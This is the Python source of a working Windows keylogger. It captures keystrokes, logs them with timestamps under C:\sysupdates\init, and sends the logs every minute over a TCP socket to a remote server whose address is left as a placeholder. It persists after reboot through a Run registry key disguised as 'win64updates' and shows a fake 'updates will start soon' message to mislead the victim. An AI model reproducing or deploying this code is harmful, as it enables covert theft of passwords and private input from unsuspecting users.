import time, os, socket
from pynput import keyboard
from datetime import datetime
import sys
import ctypes
from tkinter import messagebox
import winreg



#keylogger class is made to handle different super keys and usual keys and send them to the server
class Keylogger:
    def __init__(self, log_file_path, server_address, time_interval):
        self.log_file_path = log_file_path
        self.buffer = ""
        self.current_date = None
        self.server_address = server_address
        self.time = time_interval
        self.last_sent_time = datetime.now()
        self.interval_logs = []
        self.shift_pressed = 0



    # keyboard listener works as independent thread w.r.t while loop
    def start(self):
        with keyboard.Listener(on_press=self.on_press, on_release=self.on_release) as listener:
            while True:
                self.send_after_interval()
                time.sleep(0.2)  # slows down the while loop which reduce fast cpu consumption for smoother execution

    def get_shifted_symbol(self, key_char):
        shifted_symbols = {'1': '!', '2': '@', '3': '#', '4': '$', '5': '%', '6': '^', '7': '&', '8': '*', '9': '(',
                           '0': ')', '-': '_', '=': '+', '[': '{', ']': '}', '\\': '|', ';': ':', '\'': '"', ',': '<',
                           '.': '>', '/': '?'}
        return shifted_symbols.get(key_char, key_char) #if not found then return the key_char itself

    def is_caps_lock_on(self):
        # Check Caps Lock state
        return ctypes.windll.user32.GetKeyState(0x14) & 1 == 1

    # handle different types of keys
    def on_press(self, key):
        try:
            if key == keyboard.Key.shift or key == keyboard.Key.shift_r or key == keyboard.Key.shift_l:
                self.shift_pressed = 1

            if hasattr(key, 'char') and key.char:
                if self.shift_pressed:  # handle shift key
                    if key.char.isalpha():  # shift + alphabets => uppercase letter
                        self.buffer += key.char.upper()
                    else:  # anything other than character with shift handled here
                        self.buffer += self.get_shifted_symbol(key.char)
                else:
                    if key.char.isalpha():  # if caps lock is on for alphabets
                        self.buffer += key.char.upper() if self.is_caps_lock_on() else key.char.lower()
                    else:
                        self.buffer += key.char  # regular character

            elif key == keyboard.Key.tab:
                self.buffer += '\t'  # Handle Tab

            elif key == keyboard.Key.backspace:
                self.buffer = self.buffer[:-1]  # Handle Backspace

            elif key == keyboard.Key.space or key == keyboard.Key.enter:  # store word by word in log file
                if self.buffer:
                    self.write_to_log(self.buffer)
                    self.buffer = ""

            else:
                self.write_to_log(key)

        except:pass

    def on_release(self, key):
        # reset shift_pressed flag when shift key is released
        if key == keyboard.Key.shift or key == keyboard.Key.shift_r or key == keyboard.Key.shift_l:
            self.shift_pressed = 0

    def write_to_log(self, data):
        try:
            current_datetime = datetime.now()
            current_time_str = current_datetime.strftime("%H:%M:%S")
            timestamp = f"{current_time_str}"

            if self.current_date != current_datetime.date():  # for date changes that is logs will be stored date wise
                self.current_date = current_datetime.date()
                with open(self.log_file_path, 'a') as log_file:
                    log_file.write(f"\nLogs for date {self.current_date}\n")

            # for same day logs will be written with timestamps
            log_entry = f"{timestamp} --> {data}\n"
            with open(self.log_file_path, 'a') as log_file:
                log_file.write(log_entry)

            self.interval_logs.append(log_entry)  # store logs which are made during the time interval to send them together

        except:pass

    def send_after_interval(self):
        current_time = datetime.now()
        if (current_time - self.last_sent_time).total_seconds() >= self.time * 60:
            self.last_sent_time = current_time
            self.send_logs_to_server()

    def send_logs_to_server(self):
        try:
            logs_to_send = ''.join(self.interval_logs)

            if logs_to_send:
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                    host, port = self.server_address
                    s.connect((host, port))
                    s.sendall(logs_to_send.encode('utf-8'))
                self.interval_logs = []

        except:pass



#adding to registry keys is for persistent use so that after reboot of the machine also it persists
def add_to_registry(exe_path, key_name="win64updates"):
    try:
        reg_key_path = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run"

        reg_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_key_path, 0, winreg.KEY_READ)

        try:
            winreg.QueryValueEx(reg_key, key_name)
            return
        except FileNotFoundError:
            pass

        reg_key = winreg.CreateKeyEx(winreg.HKEY_CURRENT_USER, reg_key_path)
        winreg.SetValueEx(reg_key, key_name, 0, winreg.REG_SZ, exe_path)

        messagebox.showinfo("Success",
                                "Your updates will start soon and will close automatically when finished. You may continue with other tasks.")

    except Exception as e:
        messagebox.showerror("Error", f"Some problem in updates.Try again later.")



#the main program which starts the keylogger
def keylogger_part():
    log_directory = "C:\\sysupdates\\init" #make a log file directory
    log_file_path = os.path.join(log_directory, "init.txt")
    os.makedirs(log_directory, exist_ok=True)

    # Create the log file if it doesn't exist
    if not os.path.exists(log_file_path):
        with open(log_file_path, 'w') as file: pass

    exe_path = sys.argv[0]
    add_to_registry(exe_path) #this function will make a registry key of the exe

    server_address = ("server address", 12345)
    time_interval = 1

    keylogger = Keylogger(log_file_path, server_address, time_interval)

    keylogger.start()


if __name__ == "__main__":
    keylogger_part()

